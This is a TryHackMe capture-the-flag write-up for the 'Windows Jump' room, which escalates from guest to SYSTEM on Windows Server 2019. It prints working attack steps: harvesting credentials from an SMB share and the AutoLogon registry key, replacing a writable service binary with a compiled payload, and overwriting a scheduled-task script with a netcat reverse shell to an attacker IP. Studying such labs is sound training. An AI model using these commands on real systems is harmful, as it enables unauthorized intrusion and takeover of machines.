# TryHackMe — Windows Jump (Writeup)

## Room Overview

**Platform:** TryHackMe  
**Room:** Windows Jump  
**Difficulty:** Medium  
**OS:** Windows Server 2019 (Build 17763)  
**Objective:** Escalate from guest access to NT AUTHORITY\SYSTEM through a 4-step privilege escalation chain  

**Attack Chain:**  
`guest` → `thmuser` → `notadmin` → `svcadmin` → `SYSTEM`

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -O -A -p- <TARGET_IP>
```

Key findings:

| Port | Service | Notes |
|------|---------|-------|
| 135/tcp | MSRPC | Standard Windows RPC |
| 139/tcp | NetBIOS | SMB over NetBIOS |
| 445/tcp | SMB | Signing enabled but **not required** |
| 3389/tcp | RDP | Microsoft Terminal Services |
| 5985/tcp | WinRM | HTTP-based remote management |

The target is a standalone workstation (workgroup member, not domain-joined) running Windows Server 2019. The hostname is `PRIVESC`.

### SMB Enumeration

```bash
smbclient -L //<TARGET_IP> -U 'guest%'
crackmapexec smb <TARGET_IP> -u 'guest' -p '' --shares
```

Results revealed 4 shares. The `guest` account is active with a blank password and has **READ** access to a non-default share called `Public`.

```
ADMIN$    Remote Admin         — ACCESS DENIED
C$        Default share        — ACCESS DENIED
IPC$      Remote IPC           — READ
Public    Public file share    — READ
```

---

## Flag 1 — guest → thmuser

**Vector:** Plaintext credentials exposed in a public SMB share

### Exploitation

```bash
smbclient //<TARGET_IP>/Public -U 'guest%'
smb: \> get welcome.txt
```

Contents of `welcome.txt`:

```
Welcome to CORP-NET.
New employee default credentials
================================
Username : thmuser
Password : Password1!
Please change your password after first login.
```

### Flag

```
THM{5mb_cr3d5_1n_th3_5h4r3}
```

Location: `C:\Users\thmuser\Desktop\flag1.txt`

### Analysis

A file share intended for onboarding new employees was left accessible to the Guest account after a staff reduction. The IT department never decommissioned the workstation or cleaned up the share — a common real-world misconfiguration.

---

## Flag 2 — thmuser → notadmin

**Vector:** Windows AutoLogon credentials stored in plaintext in the registry

### Enumeration

After connecting via RDP as `thmuser`, standard enumeration was performed:

```powershell
whoami /all          # Medium integrity, Users + Remote Desktop Users, no special privileges
cmdkey /list         # No stored credentials
net user             # Confirmed accounts: thmuser, notadmin, svcadmin, Administrator
```

PowerShell history, scheduled tasks, and services revealed nothing useful at this stage. The breakthrough came from querying the Windows AutoLogon registry key:

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

Output (relevant entries):

```
AutoAdminLogon    REG_SZ    1
DefaultUserName   REG_SZ    notadmin
DefaultPassword   REG_SZ    P@ssw0rd!
```

### How AutoLogon Works

When an administrator enables automatic logon (so a machine boots straight to the desktop without a password prompt), Windows stores the credentials under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`. The `HKLM` hive is readable by all authenticated users. This means any low-privilege user on the machine can extract the AutoLogon password in cleartext with a single registry query.

### Exploitation

The `notadmin` account is not a member of `Remote Desktop Users` or `Remote Management Users`, so direct RDP/WinRM access is not possible. Instead, from within the thmuser RDP session:

```cmd
runas /user:notadmin powershell
```

Password: `P@ssw0rd!`

### Flag

```
THM{w1nl0g0n_cr3ds_3xp0s3d}
```

Location: `C:\Users\notadmin\Desktop\flag2.txt`

---

## Flag 3 — notadmin → svcadmin

**Vector:** Service Binary Hijacking — writable service executable running under a non-standard account

### Enumeration (The Mistake and The Lesson)

Initial service enumeration used a path-based filter:

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows"
```

This command **excluded** the target service because its binary resided in `C:\Windows\THMSVC\svc.exe` — matching the filter and being silently removed from output.

The correct approach is to **filter by service account**, not by path:

```cmd
wmic service get name,startname,pathname | findstr /i /v "LocalSystem LocalService NetworkService"
```

This immediately reveals:

```
THMSvc    C:\Windows\THMSVC\svc.exe    .\svcadmin
```

A custom service called `THMSvc` runs `svc.exe` under the `svcadmin` account.

### Confirming the Vector

```cmd
sc qc THMSvc
```

```
SERVICE_NAME: THMSvc
  TYPE         : 10  WIN32_OWN_PROCESS
  START_TYPE   : 3   DEMAND_START
  BINARY_PATH  : C:\Windows\THMSVC\svc.exe
  SERVICE_START_NAME : .\svcadmin
```

```cmd
icacls C:\Windows\THMSVC\svc.exe
```

```
C:\Windows\THMSVC\svc.exe Everyone:(F)
                          PRIVESC\notadmin:(I)(F)
```

The binary has **Full Control (F)** for Everyone and notadmin — anyone can replace it.

### Exploitation

**Step 1 — Create the payload** (on AttackBox):

```bash
cat > /tmp/svc.cs << 'EOF'
using System;
using System.IO;
class P {
    static void Main() {
        File.Copy(@"C:\Users\svcadmin\Desktop\flag3.txt",
                  @"C:\Users\Public\flag3.txt", true);
        File.WriteAllText(@"C:\Users\Public\svcwhoami.txt",
            System.Security.Principal.WindowsIdentity.GetCurrent().Name);
    }
}
EOF
```

**Step 2 — Connect via RDP with a shared drive:**

```bash
xfreerdp /v:<TARGET_IP> /u:thmuser /p:Password1! /cert:ignore /dynamic-resolution /drive:_share,/tmp
```

**Step 3 — Compile on target** (PowerShell as thmuser):

```powershell
copy \\TSCLIENT\_share\svc.cs C:\Users\Public\svc.cs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:C:\Users\Public\newsvc.exe C:\Users\Public\svc.cs
```

**Step 4 — Replace binary and trigger** (cmd as notadmin):

```cmd
copy C:\Windows\THMSVC\svc.exe C:\Windows\THMSVC\svc.exe.bak
copy /Y C:\Users\Public\newsvc.exe C:\Windows\THMSVC\svc.exe
sc start THMSvc
```

The service returns error 1053 (timeout) because the payload doesn't implement the Service Control Manager API, but the code **executes before the timeout**.

### Flag

```
THM{s3rv1c3_b1n4ry_h1j4ck3d}
```

Location: `C:\Users\svcadmin\Desktop\flag3.txt`

### How Service Binary Hijacking Works

When Windows starts a service, the Service Control Manager (SCM) authenticates as the configured service account using credentials stored in `HKLM\SECURITY` (accessible only to SYSTEM). The SCM then launches whatever executable is specified in `BINARY_PATH_NAME`.

The attacker doesn't need to know the service account password. By replacing the binary with a malicious payload, the SCM unknowingly executes attacker-controlled code under the service account's identity.

---

## Flag 4 — svcadmin → SYSTEM

**Vector:** Writable scheduled task script executed by SYSTEM

### Enumeration

Using a reverse shell as svcadmin for interactive enumeration:

```cmd
whoami /priv
```

```
SeChangeNotifyPrivilege       Enabled
SeCreateGlobalPrivilege       Enabled
SeIncreaseWorkingSetPrivilege Disabled
```

No `SeImpersonatePrivilege` — potato attacks are not viable. The account is in the `Users` group only, not an administrator.

Systematic checking of escalation vectors:

```cmd
sc config THMSvc obj= LocalSystem       → Access denied
sc create TestSvc binPath= cmd.exe      → Access denied
schtasks /create ... /ru SYSTEM         → Access denied
net localgroup Administrators svcadmin /add → Access denied
```

Then the critical discovery:

```cmd
icacls C:\Windows\Tasks\cleanup.bat
```

```
C:\Windows\Tasks\cleanup.bat  PRIVESC\svcadmin:(I)(M)
                               BUILTIN\Administrators:(I)(F)
                               NT AUTHORITY\SYSTEM:(I)(F)
```

The svcadmin account has **Modify (M)** permission on `cleanup.bat`. The file contains a simple temp cleanup command:

```bat
@echo off
del /Q /F "%TEMP%\*.tmp" 2>nul
```

A hidden scheduled task (not visible to svcadmin) executes this script periodically as **NT AUTHORITY\SYSTEM**.

### Exploitation

**Step 1 — Set up a listener** (AttackBox):

```bash
nc -lvnp 5555
```

**Step 2 — Overwrite cleanup.bat** (from svcadmin reverse shell):

```cmd
echo C:\Users\Public\nc.exe <ATTACKER_IP> 5555 -e cmd.exe > C:\Windows\Tasks\cleanup.bat
```

(nc.exe was previously uploaded to `C:\Users\Public\` via the TSCLIENT share)

**Step 3 — Wait for execution.** Within a few minutes, the scheduled task fires and a SYSTEM shell arrives on the listener.

### Flag

```
THM{t4sk_wr1t3_t0_SYST3M}
```

Location: `C:\flag4.txt`

### How the Scheduled Task Vector Works

Windows Task Scheduler can execute scripts and binaries on a schedule under any account, including SYSTEM. If the script file has weak permissions (in this case, Modify for svcadmin), any user with write access can replace its contents. The next time the task fires, the scheduler executes the attacker's payload with SYSTEM privileges — the highest privilege level on a Windows machine.

---

## Complete Attack Chain Summary

```
┌──────────┐   SMB Public Share    ┌──────────┐   AutoLogon Registry   ┌──────────┐
│  guest   │ ──── welcome.txt ───> │ thmuser  │ ──── reg query ──────> │ notadmin │
│          │   Password1!          │          │   P@ssw0rd!            │          │
└──────────┘                       └──────────┘                        └──────────┘
                                                                            │
                                                            Service Binary Hijack
                                                          THMSvc (svc.exe writable)
                                                                            │
                                                                            ▼
                                   ┌──────────┐   Writable cleanup.bat ┌──────────┐
                                   │  SYSTEM  │ <── scheduled task ──  │ svcadmin │
                                   │          │   (runs as SYSTEM)     │          │
                                   └──────────┘                        └──────────┘
```

| Step | From | To | Vector | Flag |
|------|------|----|--------|------|
| 1 | guest | thmuser | Credentials in SMB share | `THM{5mb_cr3d5_1n_th3_5h4r3}` |
| 2 | thmuser | notadmin | AutoLogon plaintext password in registry | `THM{w1nl0g0n_cr3ds_3xp0s3d}` |
| 3 | notadmin | svcadmin | Service binary hijacking (writable svc.exe) | `THM{s3rv1c3_b1n4ry_h1j4ck3d}` |
| 4 | svcadmin | SYSTEM | Writable scheduled task (cleanup.bat) | `THM{t4sk_wr1t3_t0_SYST3M}` |

---

## Key Takeaways

### 1. Service Enumeration — Filter by Account, Not Path

The command `findstr /v "C:\Windows"` hid `THMSvc` because its binary was inside a subfolder of `C:\Windows`. The reliable approach:

```cmd
wmic service get name,startname,pathname | findstr /i /v "LocalSystem LocalService NetworkService"
```

This filters by the **service account** and catches any custom service regardless of binary location.

### 2. Always Check ACLs on Non-Standard Files

Every privilege escalation in this chain exploited **weak file permissions**:
- `svc.exe` — `Everyone:(F)` allowed binary replacement
- `cleanup.bat` — `svcadmin:(M)` allowed script modification

Running `icacls` on every non-standard file, binary, and script is an essential enumeration habit.

### 3. cmdkey vs vaultcmd — Check Both

`cmdkey /list` does not show Domain Password credentials stored in the Windows Vault. `vaultcmd /listcreds:"Windows Credentials" /all` reveals entries that cmdkey hides. Always use both tools during enumeration.

### 4. Reverse Shells Save Time

Steps 3 and 4 relied on executing code through indirect means (service restart, scheduled task). Having a reverse shell from the target account enabled interactive enumeration instead of repeatedly compiling and deploying payloads.

### 5. Windows Enumeration Checklist

A structured approach prevents missed vectors:

- `whoami /all` — identity, groups, privileges
- `net user` / `net localgroup Administrators` — account landscape
- `reg query ... Winlogon` — AutoLogon credentials
- `cmdkey /list` + `vaultcmd /listcreds` — stored credentials
- `wmic service get name,startname,pathname` — services by account (no path filter)
- `icacls` on every non-standard binary — writable service executables
- `schtasks /query /fo LIST /v` — scheduled tasks and their Run As accounts
- `icacls` on scripts referenced by tasks — writable task scripts
- PowerShell history, Unattend.xml — credential artifacts
- `whoami /priv` — SeImpersonate for potato attacks

---

## Tools Used

- **Nmap** — Port scanning and service enumeration
- **smbclient / CrackMapExec / enum4linux** — SMB enumeration
- **xfreerdp** — RDP access with drive sharing (`/drive:_share,/tmp`)
- **C# compiler (csc.exe)** — On-target payload compilation
- **Netcat (nc.exe)** — Reverse shells
- **Mimikatz** — DPAPI credential extraction (attempted; not required for intended path)
- **vaultcmd** — Windows Vault enumeration
